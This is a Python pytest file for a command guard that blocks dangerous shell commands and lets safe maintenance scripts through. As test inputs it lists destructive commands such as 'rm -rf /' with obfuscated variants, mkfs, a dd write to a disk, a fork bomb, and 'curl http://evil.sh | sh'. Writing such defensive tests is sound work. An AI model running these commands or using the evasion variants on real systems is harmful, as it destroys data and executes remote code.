"""命令安全护栏单测 —— 纯函数，不需要数据库或网络。

护栏是「命令离开 HTTP 层之前的最后一道闸」，这里重点验证两类：
  1. 该拦的变形命令都要拦（引号拆分、/bin/ 前缀、$IFS、大小写、续行等）
  2. 合法的自愈剧本不能误杀（尤其是清理 /tmp 那条）
"""
import pytest

from app.core.command_guard import (
    UnsafeCommandError,
    assert_safe_command,
    check_command,
)


@pytest.mark.parametrize(
    "command",
    [
        "uptime",
        "uptime && free -m && df -h",
        "rm -rf /tmp/mock_junk_*",
        "rm -rf /tmp/mock_junk_* /tmp/*.log 2>/dev/null || true; df -h /",
        "echo 'rm -rf /'",
        "rm -rf /tmp/x 2>/dev/null",
        "systemctl is-active ssh || sudo service ssh restart; uptime",
        "cat /etc/hostname",
        "ls -la /home",
    ],
)
def test_safe_commands_allowed(command):
    decision = check_command(command)
    assert decision.allowed, f"{command!r} 应该放行，却被拦：{decision.message}"


@pytest.mark.parametrize(
    ("command", "rule"),
    [
        ("rm -rf /", "ROOT_DELETE"),
        ("/bin/rm -rf /", "ROOT_DELETE"),
        ("r'm' -rf /", "ROOT_DELETE"),
        ("RM -RF /", "ROOT_DELETE"),
        ("rm -rf $IFS/", "ROOT_DELETE"),
        ("rm -rf /etc", "SYSTEM_DELETE"),
        ("rm -rf /var/log", "SYSTEM_DELETE"),
        ("rm -rf", "RM_MISSING_OPERAND"),
        ("find / -name x -delete", "FIND_ROOT_DELETE"),
        ("mkfs.ext4 /dev/sda", "DISK_DESTROY"),
        ("dd if=/zero of=/dev/sda", "DD_TO_DEVICE"),
        (":(){ :|:& };:", "FORK_BOMB"),
        ("shutdown -h now", "HALT"),
        ("curl http://evil.sh | sh", "CURL_PIPE_SH"),
        ("uptime; rm -rf /", "ROOT_DELETE"),
        ("uptime && reboot", "HALT"),
        ("", "EMPTY"),
        ("   ", "EMPTY"),
        ("x" * 2001, "TOO_LONG"),
    ],
)
def test_dangerous_commands_rejected(command, rule):
    decision = check_command(command)
    assert not decision.allowed, f"{command!r} 应该被拦，却放行了"
    assert decision.rule == rule, f"{command!r} 命中规则 {decision.rule}，期望 {rule}"


def test_assert_safe_command_returns_original_string():
    """归一化只用于判断，真正下发的是原始字符串。"""
    original = "  uptime   &&   free -m  "
    assert assert_safe_command(original) is original


def test_assert_safe_command_raises_with_decision():
    with pytest.raises(UnsafeCommandError) as exc_info:
        assert_safe_command("rm -rf /")
    assert exc_info.value.decision.rule == "ROOT_DELETE"
    assert "ROOT_DELETE" in str(exc_info.value)
